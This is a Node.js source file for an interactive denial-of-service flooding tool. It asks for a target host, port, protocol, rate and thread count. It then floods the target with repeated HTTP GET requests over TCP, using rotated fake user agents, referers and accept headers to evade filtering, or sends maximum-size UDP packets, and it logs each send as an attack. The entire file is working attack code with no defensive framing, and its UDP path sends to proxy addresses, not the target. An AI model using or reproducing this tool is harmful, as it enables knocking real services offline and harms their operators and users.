import inquirer from "inquirer";
import dgram from "dgram";
import net from "net";
import https from "https";

const useragents = [
  "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
  "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
  "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
  "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
  "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
  "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
  "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
  "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
];

const ref = [
  "http://www.bing.com/search?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://duckduckgo.com/?q=",
];

const acceptall = [
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept-Encoding: gzip, deflate\r\n",
  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept-Language: en-US,en;q=0.5\r\n",
];

async function main() {
  const answers = await inquirer.prompt([
    {
      type: "input",
      name: "host",
      message: "Host address:",
      validate: (input) => (input ? true : "Host address is required"),
    },
    {
      type: "input",
      name: "port",
      message: "Port number (leave blank for random):",
      validate: (input) =>
        input === "" || !isNaN(parseInt(input))
          ? true
          : "Port must be a number",
      filter: (input) => (input === "" ? null : parseInt(input)),
    },
    {
      type: "input",
      name: "timeout",
      message: "Timeout in milliseconds (leave blank for unlimited):",
      validate: (input) =>
        input === "" || !isNaN(parseInt(input))
          ? true
          : "Timeout must be a number",
      filter: (input) => (input === "" ? null : parseInt(input)),
    },
    {
      type: "input",
      name: "protocol",
      message: "Choose the protocol:",
    },
    {
      type: "input",
      name: "packets",
      message: "Packets per second:",
      validate: (input) =>
        !isNaN(parseInt(input)) ? true : "Packets must be a number",
      filter: (input) => parseInt(input),
    },
    {
      type: "input",
      name: "threads",
      message: "Number of threads:",
      validate: (input) =>
        !isNaN(parseInt(input)) ? true : "Threads must be a number",
      filter: (input) => parseInt(input),
    },
  ]);

  console.log(`Host: ${answers.host}`);
  if (answers.host) {
    if (!answers.timeout) {
      const confirm = await inquirer.prompt([
        {
          type: "confirm",
          name: "continueWithoutTimeout",
          message: "Are you sure you want to continue without a timeout?",
          default: false,
        },
      ]);

      if (!confirm.continueWithoutTimeout) {
        console.log("Okay, I'll stop here.");
        process.exit();
      } else {
        sendPackets(
          answers.host,
          answers.port,
          null,
          answers.protocol,
          answers.packets,
          answers.threads
        );
        console.log("Packets sent without a timeout.");
      }
    } else {
      sendPackets(
        answers.host,
        answers.port,
        answers.timeout,
        answers.protocol,
        answers.packets,
        answers.threads
      );
      console.log(`Packets sent with a timeout of ${answers.timeout} ms.`);
    }
  }
}

function fetchProxies(callback) {
  https
    .get("https://spys.me/proxy.txt", (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        const proxies = data
          .split("\n")
          .filter((line) => line.includes(":"))
          .map((line) => {
            const [ip, port] = line.split(":");
            return { ip, port: parseInt(port, 10) };
          });
        callback(proxies);
      });
    })
    .on("error", (err) => {
      console.error("Error fetching proxy list:", err);
    });
}

function sendPackets(host, port, timeout, protocol, packets, threads) {
  const maxMessageSize = 65507;
  let message = "X".repeat(maxMessageSize);

  const startTime = new Date();
  const interval = 100; // Delay in milliseconds between packets

  function startFlood() {
    const userAgent =
      "User-Agent: " +
      useragents[Math.floor(Math.random() * useragents.length)] +
      "\r\n";
    const accept = acceptall[Math.floor(Math.random() * acceptall.length)];
    const referer =
      "Referer: " + ref[Math.floor(Math.random() * ref.length)] + host + "\r\n";
    const content = "Content-Type: application/x-www-form-urlencoded\r\n";
    const length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n";
    const targetHost = `GET / HTTP/1.1\r\nHost: ${host}:${port}\r\n`;
    const mainReq =
      targetHost + userAgent + accept + referer + content + length + "\r\n";

    let sentPackets = 0;

    function sendPacket() {
      if (protocol === "UDP") {
        const socket = dgram.createSocket("udp4");

        function sendUdpPacket(proxy) {
          if (timeout) {
            const currentTime = new Date();
            if (currentTime.getTime() >= startTime.getTime() + timeout) {
              console.log("Timeout reached, stopping packet sending.");
              return;
            }
          }

          const buffer = Buffer.from(message);
          const targetPort = port || Math.floor(Math.random() * 65535 + 1);
          socket.send(
            buffer,
            0,
            buffer.length,
            targetPort,
            proxy.ip,
            function (err, bytes) {
              if (err) throw err;
              console.log(
                `UDP packet sent to ${proxy.ip}:${targetPort} via proxy ${proxy.ip}:${proxy.port}`
              );
            }
          );

          setTimeout(() => sendUdpPacket(proxy), interval);
        }

        fetchProxies((proxies) => {
          if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            sendUdpPacket(proxy);
          } else {
            console.error("No proxies available.");
          }
        });
      } else if (protocol === "TCP") {
        const client = new net.Socket();

        client.connect(port, host, () => {
          console.log(`TCP connection established to ${host}:${port}`);
          function sendTcpPacket() {
            if (timeout) {
              const currentTime = new Date();
              if (currentTime.getTime() >= startTime.getTime() + timeout) {
                console.log("Timeout reached, stopping packet sending.");
                client.end();
                return;
              }
            }

            client.write(mainReq, (err) => {
              if (err) throw err;
              console.log(`TCP packet sent to ${host}:${port}`);
            });

            for (let i = 0; i < packets; i++) {
              client.write(mainReq, (err) => {
                if (err) throw err;
                sentPackets++;
                console.log(
                  `[+] Attacking ${host}:${port} | Sent: ${sentPackets}`
                );
              });
            }
          }

          sendTcpPacket();
        });

        client.on("error", (err) => {
          console.error(`TCP connection error: ${err.message}`);
        });

        client.on("close", () => {
          console.log("TCP connection closed");
        });

        setTimeout(sendPacket, 1000 / packets);
      }
    }

    sendPacket();
  }

  for (let i = 0; i < threads; i++) {
    startFlood();
  }
}

main();
